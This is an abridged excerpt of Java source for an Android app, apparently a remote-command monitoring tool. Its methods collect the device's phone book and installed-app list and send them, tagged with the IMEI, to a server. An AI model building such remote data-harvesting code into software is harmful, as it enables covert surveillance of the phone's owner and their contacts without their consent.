...
import com.hyadesinc.curiosus.lib.Contact;
...
public class CommandsModule {
	...
	public static void getPhoneBook(Context context, String email){
		try {
	        ...
	        if (contacts.size() > 0) {
	        	...
	        	new ServerMessanger(
	        		context,
	        		new ServerMessage(MessageType.CONTACT, settings.imei(), contacts)
	...
	public static void getApplicationList(Context context, String email){
		try {
			...
			new ServerMessanger(
        		context,
        		new ServerMessage(MessageType.APPLIST, settings.imei())
	...
	public static void updateSettings(Context context){
		if (AppService.sThreadManager != null) {
			...
			AppService.sThreadManager.addTask(new ServerMessanger(context, new ServerMessage(MessageType.SETTINGS_GET, settings.imei()),
	...
	public static void connect(final Context context, final SettingsManager settings, final String login){
		new ServerMessanger(context, new ServerMessage(MessageType.CONNECT, settings.imei()),
			new ServerMessanger.ICallBack() {
				@Override
